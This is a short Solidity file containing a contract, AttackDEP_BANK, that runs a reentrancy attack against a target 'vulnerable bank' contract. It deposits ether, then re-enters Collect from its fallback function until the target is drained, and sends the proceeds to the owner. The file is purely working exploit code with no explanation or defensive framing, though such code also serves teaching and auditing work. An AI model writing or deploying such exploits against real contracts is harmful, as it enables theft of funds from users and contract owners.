pragma solidity ^0.4.19;

interface IVulnerableBank {
    function Deposit() external payable;
    function Collect(uint _am) external payable;
}

contract AttackDEP_BANK {
    IVulnerableBank public target;
    address public owner;
    uint public amountToSteal;

    constructor(address _target) public {
        target = IVulnerableBank(_target);
        owner = msg.sender;
    }

    function initiateAttack() external payable {
        require(msg.value >= 1 ether); // Seed the bank
        target.Deposit.value(msg.value)();
        amountToSteal = msg.value;
        target.Collect(amountToSteal);
    }

    // Reentrant fallback
    function() external payable {
        if (address(target).balance >= amountToSteal) {
            target.Collect(amountToSteal);
        } else {
            owner.transfer(address(this).balance); // Drain and exit
        }
    }
}

